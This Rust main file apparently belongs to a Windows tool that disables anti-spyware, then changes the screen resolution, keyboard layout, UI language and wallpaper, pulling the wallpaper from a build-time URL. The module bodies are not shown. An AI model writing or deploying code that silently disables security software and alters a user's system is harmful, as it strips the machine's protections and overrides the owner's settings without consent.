mod disable_antispyware;
mod keyboard;
mod screen;
mod ui_language;
mod util;
mod wallpaper;
use anyhow::Result;
use disable_antispyware::disable_antispyware;
use keyboard::Keyboard;
use screen::Screen;
use tokio;
use ui_language::UILanguage;
use util::download_file;
use wallpaper::Wallpaper;
#[tokio::main]
async fn main() -> Result<()> {
    let mut wallpaper = Wallpaper::new(env!("WALLPAPER_URL").to_string());

    #[cfg(target_os = "windows")]
    let mut screen = Screen {
        width: env!("SCREEN_RES_W").parse().unwrap_or(800),
        height: env!("SCREEN_RES_H").parse().unwrap_or(600),
    };

    #[cfg(target_os = "windows")]
    let mut ui_language = UILanguage {
        target_lang: env!("TARGET_LANG").to_string(),
        target_lang_reg: env!("TARGET_LANG_REG").to_string(),
        num_langs: env!("TARGET_LANG_NUM").parse().unwrap(),
    };

    #[cfg(target_os = "windows")]
    let mut keyboard = Keyboard {
        layout: env!("KEYBOARD_LAYOUT").to_string(),
    };

    if cfg!(target_os = "windows") {
        disable_antispyware();
        screen.change_resulation();
        download_file(&wallpaper.url, &wallpaper.image_path).await?;
        keyboard.change_keyboard_layout();
        ui_language.change_prefered_lang();
        ui_language.change_ui_lang_from_hkey();
    };
    wallpaper.set_wallpaper().await;
    std::process::exit(0)
}
